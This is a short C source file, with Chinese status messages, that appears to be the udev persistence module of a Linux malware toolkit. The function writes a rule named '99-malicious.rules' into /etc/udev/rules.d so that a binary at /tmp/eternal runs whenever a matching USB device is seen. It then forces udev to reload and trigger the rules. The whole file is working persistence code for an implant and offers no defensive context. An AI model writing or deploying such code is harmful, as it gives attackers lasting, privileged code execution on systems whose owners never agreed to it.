#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "info.h"
#include "linux_persistence_udev.h"

#ifdef UDEV_MOD
void setup_udev_persistence() {
    printf("设置UDEV持久化...\n");
    const char* udev_rule_path = "/etc/udev/rules.d/99-malicious.rules";
    FILE *udev_rule_file = fopen(udev_rule_path, "w");
    if (udev_rule_file) {
        fprintf(udev_rule_file, "ATTR{idVendor}==\"1234\", ATTR{idProduct}==\"5678\", RUN+=\"/tmp/eternal\"\n");
        fclose(udev_rule_file);
        printf("UDEV 规则已添加。\n");
        
        // Reload udev rules
        system("udevadm control --reload-rules");
        system("udevadm trigger");
        printf("UDEV 规则已重新加载。\n");
    } else {
        perror("无法创建UDEV规则文件");
    }
}
#endif